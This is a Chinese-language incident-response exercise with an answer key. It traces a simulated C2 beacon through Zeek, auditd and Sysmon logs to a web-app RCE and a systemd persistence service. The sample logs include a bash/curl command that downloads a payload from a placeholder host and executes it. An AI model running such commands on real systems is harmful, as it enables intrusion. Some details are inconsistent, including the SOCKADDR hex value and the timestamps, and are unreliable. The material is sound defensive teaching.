# 練習 C — 跨網路 + 主機關聯：追一條 C2 beacon 從偵測到落地

> 目標：把 Ch 24 的網路鑑識、Ch 21–22 的 Linux 主機鑑識、Ch 2 的 ATT&CK 對映全部拼在一起。給你網路層的 Zeek log 和主機層的 Sysmon/auditd log，從週期性 beacon 偵測開始，一路追到主機上的落地 payload 和 persistence，輸出完整的關聯鏈。

---

## 背景動機

你拿到的 log 來自一起真實 IR 的縮減版場景：公司的 EDR 觸發了一個低信心的 alert，說某台內網主機有可疑的出向流量，但沒有更多細節。你是第一個接手的分析師，需要從原始 log 出發，判斷這是不是真正的入侵，如果是，攻擊者做了什麼。

這個練習的核心技能是**跨層關聯**：網路 log 告訴你「有可疑連線」，主機 log 告訴你「是哪個進程建的」，把兩層 log 用時間戳和 IP/hostname 縫合起來，才能得到完整的攻擊鏈。

---

## 情境設定

**環境說明：**
- 內網：`10.0.0.0/8`，受監控主機為 `10.0.1.88`（Linux）
- 網路監控：Zeek 部署在出口（`conn.log`、`dns.log`、`http.log` 都有）
- 主機監控：auditd + Sysmon for Linux（`/var/log/audit/audit.log`、`/var/log/sysmon/sysmon.log`）
- 時間：UTC，所有 log 時間已同步

**初始告警**：EDR 在 `2024-03-15 02:00~06:00` 區間，偵測到 `10.0.1.88` 有出向流量到非常規目的地，模式不像正常業務流量。

---

## 任務規格

你要完成以下四個分析任務，每個任務對應一個輸出物：

### 任務 1：從 Zeek 網路 log 認出 beacon 特徵

分析以下 Zeek `conn.log` 片段，找出 beacon 特徵，確認 C2 域名，計算 beacon interval。

**Zeek conn.log（節錄，TSV 格式，示意資料）：**

```
# ts           uid         id.orig_h    id.orig_p  id.resp_h      id.resp_p  proto  duration  orig_bytes  resp_bytes  conn_state
1710468000.1   C1a2b3c4d   10.0.1.88    54321      203.0.113.42   443        tcp    0.235      512         1024        SF
1710468060.3   C1a2b3c4e   10.0.1.88    54322      203.0.113.42   443        tcp    0.241      508         1032        SF
1710468120.7   C1a2b3c4f   10.0.1.88    54323      203.0.113.42   443        tcp    0.228      515         1019        SF
1710468181.1   C1a2b3c50   10.0.1.88    54324      203.0.113.42   443        tcp    0.239      511         1028        SF
1710468240.5   C1a2b3c51   10.0.1.88    54325      203.0.113.42   443        tcp    0.233      509         1026        SF
1710468302.8   C1a2b3c52   10.0.1.88    54326      203.0.113.42   443        tcp    0.245      514         1031        SF
# ... 以上模式延續約 4 小時
# 對照：正常業務流量（不同目的地，大小差異大，無週期性）
1710468045.2   C9x8y7z6    10.0.1.88    55001      10.0.2.10      8080       tcp    2.105      8192        32768       SF
1710468155.8   Caa1bb2cc   10.0.1.88    55002      10.0.2.10      8080       tcp    1.897      4096        16384       SF
```

**Zeek dns.log（節錄）：**

```
# ts           uid         query                    qtype_name  answers
1710467990.5   Cdns0001    updates.microsoft-cdn.net  A         203.0.113.42
1710467991.1   Cdns0002    www.google.com             A         142.250.80.36
1710468055.2   Cdns0003    updates.microsoft-cdn.net  A         203.0.113.42
# 同樣的域名每 60 秒左右重新解析一次
```

**預期產出 1**：一份 beacon 分析報告，包含：
- beacon interval（秒），計算方式
- jitter 百分比估算
- 流量特徵（bytes 大小的規律性）
- C2 域名及其可疑原因
- ATT&CK 技術 ID

---

### 任務 2：關聯到主機——哪個進程建了這條連線

有了 C2 IP（`203.0.113.42`）和時間窗口，去主機的 auditd log 找對應的 socket 事件，確認是哪個進程（PID、進程名、命令列、parent 進程）在維持這條連線。

**auditd log（節錄，示意資料）：**

```
type=SYSCALL msg=audit(1710468000.094:1234): arch=c000003e syscall=49 success=yes exit=0
 a0=5 a1=7f... a2=10 a3=0 items=1 ppid=1021 pid=1022 auid=1000 uid=0 gid=0
 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=3
 comm="update-helper" exe="/usr/local/bin/update-helper" key="network_connect"

type=SOCKADDR msg=audit(1710468000.094:1234):
 saddr=020001BB CB007012A 0000000000000000
# saddr 解碼：AF_INET port=443 IP=203.0.113.42

type=SYSCALL msg=audit(1710468000.095:1235): arch=c000003e syscall=42 success=yes exit=0
 ppid=1021 pid=1022 comm="update-helper" exe="/usr/local/bin/update-helper" key="network_connect"

# 同時間的 Sysmon for Linux ProcessCreate 事件（示意）：
<Event>
  <EventID>1</EventID>
  <UtcTime>2024-03-15 01:59:48.123</UtcTime>
  <ProcessId>1022</ProcessId>
  <Image>/usr/local/bin/update-helper</Image>
  <CommandLine>/usr/local/bin/update-helper --daemon --config /etc/.system/config.enc</CommandLine>
  <ParentProcessId>1021</ParentProcessId>
  <ParentImage>/usr/lib/systemd/systemd</ParentImage>
  <Hashes>SHA256=a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd</Hashes>
  <User>root</User>
</Event>
```

**預期產出 2**：進程關聯表，包含：
- PID、進程名、完整路徑、命令列
- Parent PID / Parent 進程
- 啟動時間
- 可疑點說明（為什麼這個進程異常）

---

### 任務 3：在主機端找落地 payload 與 persistence

攻擊者不只有這個進程。用 Sysmon FileCreate、RegistryEvent（Linux 對應：auditd file watch）、和 systemd/cron 相關事件，找出初始落地的 payload 怎麼來的，以及 persistence 機制。

**Sysmon for Linux 事件（節錄，示意資料）：**

```xml
<!-- FileCreate：落地 payload -->
<Event>
  <EventID>11</EventID>
  <UtcTime>2024-03-14 23:41:15.002</UtcTime>
  <ProcessId>4521</ProcessId>
  <Image>/usr/bin/curl</Image>
  <TargetFilename>/usr/local/bin/update-helper</TargetFilename>
  <Hashes>SHA256=a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd</Hashes>
  <User>root</User>
</Event>

<!-- ProcessCreate：curl 是誰啟動的 -->
<Event>
  <EventID>1</EventID>
  <UtcTime>2024-03-14 23:41:14.891</UtcTime>
  <ProcessId>4521</ProcessId>
  <Image>/usr/bin/curl</Image>
  <CommandLine>curl -s -o /usr/local/bin/update-helper https://203.0.113.42/payload/uh -H "X-Token: eyJhb..."</CommandLine>
  <ParentProcessId>4518</ParentProcessId>
  <ParentImage>/usr/bin/bash</ParentImage>
</Event>

<!-- ProcessCreate：bash 是誰啟動的 -->
<Event>
  <EventID>1</EventID>
  <UtcTime>2024-03-14 23:41:12.344</UtcTime>
  <ProcessId>4518</ProcessId>
  <Image>/usr/bin/bash</Image>
  <CommandLine>bash -c "curl -s -o /usr/local/bin/update-helper https://203.0.113.42/payload/uh -H \"X-Token: eyJhb...\" && chmod +x /usr/local/bin/update-helper && /usr/local/bin/update-helper --daemon --config /etc/.system/config.enc"</CommandLine>
  <ParentProcessId>4501</ParentProcessId>
  <ParentImage>/usr/bin/python3</ParentImage>
  <CommandLine_parent>/usr/bin/python3 /opt/webapp/server.py</CommandLine_parent>
</Event>

<!-- Persistence：建立 systemd service -->
<Event>
  <EventID>11</EventID>
  <UtcTime>2024-03-14 23:41:22.771</UtcTime>
  <ProcessId>1022</ProcessId>
  <Image>/usr/local/bin/update-helper</Image>
  <TargetFilename>/etc/systemd/system/system-update-helper.service</TargetFilename>
</Event>
```

**auditd 補充（systemd service 內容讀取，示意）：**

```
type=PATH msg=audit(1710462082.771:5678): item=0 name="/etc/systemd/system/system-update-helper.service"
 inode=... dev=... mode=0100644 ouid=0 ogid=0
```

**預期產出 3**：完整感染鏈，從 initial access 到 C2 beacon，包含：
- 初始入侵點（哪個服務被利用）
- 每一步的進程和動作
- Persistence 機制（systemd service 的內容推斷）
- 每一步的時間戳

---

### 任務 4：ATT&CK 對映

把你找到的所有攻擊者行為，對映到 MITRE ATT&CK 技術 ID。

**預期產出 4**：ATT&CK 對映表。

---

## 期望輸出範例格式

### 任務 1 範例輸出

```
## Beacon 分析

IP：203.0.113.42
域名：updates.microsoft-cdn.net
Beacon interval：約 60 秒（實測：60.2s、60.4s、60.4s、59.4s、62.3s 等，平均 60.5s）
Jitter：約 2%（max deviation ~2.3s from mean）
流量大小：orig_bytes 508–515 B（極小方差），resp_bytes 1019–1032 B（極小方差）
連線時長：0.228–0.245s（極度規律）
C2 域名可疑點：域名模仿合法 CDN（microsoft-cdn.net 非 microsoft.com），但 WHOIS 顯示近期注冊

ATT&CK：T1071.001（Application Layer Protocol: Web Protocols）
         T1571（Non-Standard Port）← 如有非 443
         T1568.002（DNS 用於 C2 重定向）
```

### 任務 2 範例輸出

```
## 進程關聯

PID：1022
進程名：update-helper
完整路徑：/usr/local/bin/update-helper（非標準路徑，/usr/local/bin 下的自訂執行檔）
命令列：/usr/local/bin/update-helper --daemon --config /etc/.system/config.enc
Parent PID：1021（systemd）
啟動時間：2024-03-14 23:41:22 UTC（推算：payload 落地後約 10 秒）
執行身分：root

可疑點：
- 進程名模仿系統更新工具（update-helper），但位於非標準路徑
- config 藏在 /etc/.system/（隱藏目錄）
- --daemon 旗在背景執行，且由 systemd 直接啟動（persistence 成立）
- SHA256 不在任何已知正常工具資料庫中
```

---

## 分段實作建議

### Step 1：計算 beacon interval（15 分鐘）

1. 從 `conn.log` 取出連到 `203.0.113.42:443` 的所有連線，按 `ts` 排序。
2. 計算相鄰連線的 `ts` 差值（interval）。
3. 統計 mean / stddev / max deviation；jitter = stddev / mean * 100%。
4. 比較 `orig_bytes` 和 `resp_bytes` 的方差——beacon 的特徵是兩者都非常規律。
5. 從 `dns.log` 找這個 IP 對應的域名，分析域名的可疑點（是否模仿合法域名、TLD、注冊時間）。

```bash
# 示意：用 zeek-cut 提取欄位（實際指令依 Zeek 版本而異）
cat conn.log | zeek-cut ts id.resp_h id.resp_p orig_bytes resp_bytes duration \
  | awk '$2 == "203.0.113.42" && $3 == "443"' \
  | sort -n \
  | awk 'NR>1 {print $1 - prev; prev=$1} NR==1 {prev=$1}'
```

### Step 2：關聯網路事件到主機進程（20 分鐘）

1. 有了 C2 IP 和時間窗口，去 auditd log 找 `syscall=42`（connect）或 `syscall=49`（bind）+ `SOCKADDR` 欄位含目的 IP。
2. SOCKADDR 是二進位編碼，解碼格式：`AF_INET(2B) port(2B big-endian) IP(4B)`。`203.0.113.42` = `CB007012A`（hex）。
3. 從 syscall 事件取 PID，交叉到 Sysmon `EventID=1`（ProcessCreate）找完整的命令列和 parent chain。
4. 記錄進程啟動時間（從 Sysmon UtcTime）和 beacon 第一次出現時間的關係。

### Step 3：往回追 initial access（25 分鐘）

1. 有了惡意進程的 PID（1022），往上找它的 parent（1021=systemd），再找是誰建立了 systemd service（PID 1022 自己 FileCreate 了 `.service` 檔）。
2. 再找 PID 1022 是怎麼來的：看 Sysmon `EventID=1` 裡 1022 的 CommandLine，發現它是 bash 啟動的（PID 4518）。
3. 繼續往上：bash 的 parent 是 Python web app（PID 4501），這就是 initial access 點——Web Application 的 Remote Code Execution（攻擊者透過 web app 注入 bash 命令）。
4. 整理時序：T-20m web RCE → T-18m curl 下載 payload → T-17m payload 執行並建 systemd service → T=0 開始 beacon。

### Step 4：ATT&CK 對映（10 分鐘）

用你整理好的攻擊鏈，對映每一個 TTP：

| 攻擊者動作 | ATT&CK ID | 名稱 |
|---|---|---|
| Web RCE | ? | ? |
| curl 下載 payload | ? | ? |
| Payload 落地 `/usr/local/bin/` | ? | ? |
| 建立 systemd service | ? | ? |
| C2 beacon（HTTPS） | ? | ? |
| 域名模仿（microsoft-cdn.net） | ? | ? |

自己填完之後對照下面的參考解答。

### Step 5：寫關聯鏈報告（10 分鐘）

把四個任務的輸出整合成一份簡短的事件摘要，格式參考 Ch 4 的鑑識報告結構：時間線 → 攻擊手法 → 影響範圍 → 建議處置。

---

## 卡住提示

**Q：SOCKADDR 怎麼解碼 IP？**

SOCKADDR 二進位格式（IPv4）：2 bytes AF_INET（`02 00`） + 2 bytes port（big-endian） + 4 bytes IP（big-endian）。
`203.0.113.42` 的 hex：`CB` = 203，`00` = 0，`71` = 113，`2A` = 42，所以是 `CB00712A`。
Port 443 的 hex：`01BB`（big-endian）。

**Q：Zeek conn.log 的 ts 是 Unix epoch，怎麼換算？**

```bash
date -d @1710468000  # Linux
python3 -c "import datetime; print(datetime.datetime.utcfromtimestamp(1710468000))"
```

**Q：我怎麼知道 parent-child 進程關係是真的還是被偽造的？**

auditd 記錄的 `ppid` 是 kernel 層級的，不能被用戶進程偽造。Sysmon for Linux 也是從 kernel event 讀的。這兩者的 parent-child 關係是可信的。

**Q：systemd service 的內容怎麼推斷？**

從 FileCreate 事件你知道 `/etc/systemd/system/system-update-helper.service` 被建立，建立者是 PID 1022（update-helper 本身，這是 self-persistence）。Service 的內容可以從啟動後的進程命令列反推：`ExecStart=/usr/local/bin/update-helper --daemon --config /etc/.system/config.enc`，加上 `[Install] WantedBy=multi-user.target`。

---

## 測試用例表

完成練習後，用以下問題自我測試：

| 測試項目 | 你的答案 | 正確答案（參考解答） |
|---|---|---|
| C2 IP | | 203.0.113.42 |
| C2 域名 | | updates.microsoft-cdn.net |
| Beacon interval | | ~60 秒 |
| Jitter | | ~2% |
| 惡意進程完整路徑 | | /usr/local/bin/update-helper |
| Payload 下載方式 | | curl 從 C2 下載 |
| Initial access 入口 | | Python web app（server.py）RCE |
| Persistence 機制 | | systemd service（system-update-helper.service） |
| 感染到 beacon 的時間差 | | 約 20 分鐘 |

---

## 參考解答

<details>
<summary>展開完整參考解答（建議先自己做完再看）</summary>

### 解答 1：Beacon 分析

**計算 beacon interval：**

從 conn.log 的 `ts` 欄位，相鄰連線的差值：
- 1710468060.3 - 1710468000.1 = 60.2s
- 1710468120.7 - 1710468060.3 = 60.4s
- 1710468181.1 - 1710468120.7 = 60.4s
- 1710468240.5 - 1710468181.1 = 59.4s
- 1710468302.8 - 1710468240.5 = 62.3s

Mean ≈ 60.5s，Stddev ≈ 1.1s，Jitter ≈ 1.8%

**流量特徵：**
- `orig_bytes`：508–515 B，range 7 B（極小方差）
- `resp_bytes`：1019–1032 B，range 13 B（極小方差）
- `duration`：0.228–0.245s，range 0.017s（極小方差）

這種「幾乎等間隔、payload 大小幾乎固定」的模式是典型的 C2 beacon——C2 agent 定時呼叫 C2 server 的 check-in，server 回應固定大小的指令封包（可能加密，所以大小很固定）。

**域名可疑點：**
- `updates.microsoft-cdn.net`：模仿合法的 Microsoft CDN 域名，但合法的 Microsoft CDN 是 `*.azureedge.net`、`*.microsoft.com` 等，`microsoft-cdn.net` 是獨立注冊的域名，與 Microsoft 無關。
- 域名用於品牌冒充（brand abuse）+ 防止通訊看起來可疑（defence evasion）。

**ATT&CK 對映：**
- `T1071.001` — Application Layer Protocol: Web Protocols（HTTPS C2）
- `T1568.002` — Dynamic Resolution: Domain Generation Algorithms（若改域名）或直接 `T1568` dynamic resolution
- `T1583.001` — Acquire Infrastructure: Domains（域名冒充）

---

### 解答 2：進程關聯

**完整進程樹：**

```
systemd (PID 1021)
└── update-helper (PID 1022)
      /usr/local/bin/update-helper --daemon --config /etc/.system/config.enc
      SHA256: a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd
      啟動時間：2024-03-14 23:41:22 UTC（由 systemd 在開機或 enable 後啟動）
      執行身分：root
```

**SOCKADDR 解碼驗證：**

auditd `SOCKADDR saddr=020001BB CB007012A`：
- `0200`：AF_INET
- `01BB`：port 443（十六進位 0x01BB = 443）
- `CB007012A` → 讀成 `CB 00 71 2A` = 203.0.113.42

確認：PID 1022（update-helper）對 `203.0.113.42:443` 建立連線，與 Zeek conn.log 的觀察完全吻合。

**可疑點：**
1. `/usr/local/bin/` 下的執行檔：這個目錄通常是管理員手動裝的工具，不會有系統服務，且名稱 "update-helper" 模仿系統工具。
2. `--config /etc/.system/config.enc`：config 放在 `/etc/.system/`（以點開頭的隱藏目錄），`.enc` 副檔名暗示加密設定（C2 設定加密是常見的 anti-analysis 手法）。
3. 以 root 執行：C2 agent 以 root 執行，代表攻擊者在 initial access 時就取得或提升了 root 權限。

---

### 解答 3：完整感染鏈

**時間線重建：**

```
2024-03-14 23:41:12 UTC  [T-10s]
  Python web app (PID 4501, /usr/bin/python3 /opt/webapp/server.py)
  → spawn bash (PID 4518)
  → cmdline: bash -c "curl ... && chmod +x ... && ..."
  判斷：Web Application RCE。攻擊者透過 server.py 的漏洞（或已取得的 webshell）
       注入 OS command，Python web 進程 spawn 出 bash。

2024-03-14 23:41:14 UTC  [T-8s]
  curl (PID 4521)，由 bash 4518 啟動
  → 從 https://203.0.113.42/payload/uh 下載 payload
  → 帶自訂 header X-Token（認證 token，確保只有攻擊者能下載）
  → 寫入 /usr/local/bin/update-helper

2024-03-14 23:41:15 UTC  [T-7s]
  FileCreate: /usr/local/bin/update-helper
  SHA256: a1b2c3d4e5...

2024-03-14 23:41:22 UTC  [T=0]
  update-helper (PID 1022) 啟動（由 bash 中的 && 鏈串直接執行）
  → FileCreate: /etc/systemd/system/system-update-helper.service
  → 建立 persistence

[T+0 之後，systemd enable/start 後]
  PID 1022 常駐執行
  → 每 ~60 秒 beacon 到 203.0.113.42:443（持續 4 小時以上）

推算感染鏈：
  Initial Access（Web RCE）
  → Execution（curl + bash command injection）
  → Ingress Tool Transfer（下載 payload）
  → Persistence（systemd service）
  → C2（HTTPS beacon）
```

**Persistence 機制推斷：**

`system-update-helper.service` 的可能內容：
```ini
[Unit]
Description=System Update Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/update-helper --daemon --config /etc/.system/config.enc
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
```

`Restart=always`：進程被 kill 後 systemd 會在 5 秒後重啟，增加移除難度。

---

### 解答 4：ATT&CK 完整對映

| 攻擊者動作 | ATT&CK ID | 名稱 |
|---|---|---|
| Python web app 被利用執行 OS command | T1190 | Exploit Public-Facing Application |
| bash -c 執行 shell command | T1059.004 | Command and Scripting Interpreter: Unix Shell |
| curl 從 C2 下載 payload | T1105 | Ingress Tool Transfer |
| Payload 放在 /usr/local/bin/（模仿系統工具名稱） | T1036.005 | Masquerading: Match Legitimate Name or Location |
| 建立 systemd service | T1543.002 | Create or Modify System Process: Systemd Service |
| HTTPS C2 beacon | T1071.001 | Application Layer Protocol: Web Protocols |
| 域名模仿 Microsoft CDN | T1583.001 / T1036 | Acquire Infrastructure: Domains / Masquerading |
| Config 加密藏在隱藏目錄 | T1027 | Obfuscated Files or Information |
| 以 root 執行 C2 agent | T1078.003 | Valid Accounts: Local Accounts（若用 root credential） |

---

### 解答：完整偵測點對映

一條完整的關聯鏈要展示「哪一層的哪個偵測抓到了什麼」：

```
偵測層    log 來源              事件/特徵                        對應 ATT&CK
─────────────────────────────────────────────────────────────────────────────
網路      Zeek conn.log         60s interval beacon to 203.0.113.42:443    T1071.001
網路      Zeek dns.log          updates.microsoft-cdn.net 週期解析         T1568
主機      auditd                connect(2) syscall → 203.0.113.42:443      T1071.001
主機      Sysmon EventID=1      update-helper process cmdline              T1036.005
主機      Sysmon EventID=11     FileCreate /usr/local/bin/update-helper    T1105
主機      Sysmon EventID=11     FileCreate systemd service 檔              T1543.002
主機      Sysmon EventID=1      bash -c "curl..." parent=python3           T1059.004 + T1190
```

從**網路**看到 beacon 是入口，從**主機**找到進程才能確認是真正的入侵而非誤報，再從**進程鏈**往上追才知道 initial access 點。三層缺一不可。

</details>

---

## 延伸挑戰

完成基本任務後，試試：

1. **寫 Zeek Script 自動偵測 beacon**：用 Zeek 的 `connection_state_remove` event，計算同一 dest IP 的連線 interval，超過一定閾值就 alert。

2. **寫 Sigma 規則抓 systemd persistence**：條件：`EventID=11`（Sysmon FileCreate），`TargetFilename` 含 `/etc/systemd/system/`，且建立進程不是已知的套件管理工具（不是 `dpkg`、`apt`、`systemctl`）。

3. **估算資料外洩量**：如果 C2 beacon 的 `resp_bytes` 代表 C2 發指令（小），偶爾出現 `orig_bytes` 大幅增加的連線代表資料回傳——從 conn.log 找有沒有這樣的事件，算出大約外洩了多少。

4. **跨欄位關聯用 Jupyter + Pandas**：把 conn.log 和 Sysmon log 載入 Pandas DataFrame，用時間窗口 join（5 秒容差），自動把網路事件和主機進程事件縫合起來，輸出關聯結果。

5. **VT + WHOIS 查 IOC**：對 `203.0.113.42` 和 `updates.microsoft-cdn.net` 做 VirusTotal 查詢和 WHOIS 查詢，評估這些 IOC 的可信度和攻擊者基礎設施的年齡。新注冊（< 30 天）的域名是強訊號。

---

## 自我檢核

完成整個練習後，不看解答回答：

1. Beacon 和隨機出向流量的核心差別是什麼？哪兩個 Zeek 欄位最能區分？
2. 為什麼需要同時看 Zeek conn.log 和 auditd？只看其中一個會缺少什麼資訊？
3. 攻擊者把 config 加密放在 `/etc/.system/`（隱藏目錄），這對應 ATT&CK 哪個技術，對我們的偵測有什麼影響？
4. 如果 systemd service 設了 `Restart=always`，IR 時應該怎麼清理（順序很重要）？
5. 這次感染鏈的 initial access 點是 Python web app，哪些 Sysmon 事件讓你確定的？

---

→ [下一章：Ch 27 Hunting 方法論](./27-threat-hunting-methodology.md)
